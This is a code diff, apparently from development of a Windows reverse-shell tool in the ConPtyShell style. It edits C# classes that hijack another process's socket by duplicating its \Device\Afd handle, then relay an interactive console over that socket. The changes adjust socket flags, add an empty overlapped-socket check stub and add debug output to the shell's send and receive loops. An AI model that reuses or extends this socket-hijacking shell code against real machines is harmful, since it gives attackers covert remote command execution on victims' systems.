@@ -358,6 +358,7 @@ public static class SocketHijacking {
         return ret;
     }
 
+    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
     private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle) {
         IntPtr retSocket = IntPtr.Zero;
         IntPtr duplicatedSocket = IntPtr.Zero;
@@ -365,7 +366,8 @@ public static class SocketHijacking {
         int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
         if (status == 0)
         {
-            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
+            // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
+            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
             if (duplicatedSocket.ToInt64() > 0) {
                 retSocket = duplicatedSocket;
             }
@@ -522,6 +524,10 @@ public static class SocketHijacking {
         return inherited;
     }
 
+    private static void CheckOverlappedSocket(IntPtr socket) {
+       
+    }
+
     public static IntPtr DuplicateTargetProcessSocket(Process targetProcess)
     {
         IntPtr targetSocketHandle = IntPtr.Zero;
@@ -538,6 +544,7 @@ public static class SocketHijacking {
                     closesocket(dupSocketHandle);
                     continue;
                 }
+                CheckOverlappedSocket(dupSocketHandle);
                 targetSocketHandle = dupSocketHandle;
                 break;
             }
@@ -972,6 +979,7 @@ public static class ConPtyShell
             readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
             bytesSent = send(shellSocket, bytesToWrite, bufferSize, 0);
         } while (bytesSent > 0 && readSuccess);
+        Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
     }
     
     private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket){
@@ -998,6 +1006,7 @@ public static class ConPtyShell
             nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
             writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);	
         } while (nBytesReceived > 0 && writeSuccess);
+        Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
         TerminateProcess(hChildProcess, 0);
     }
     
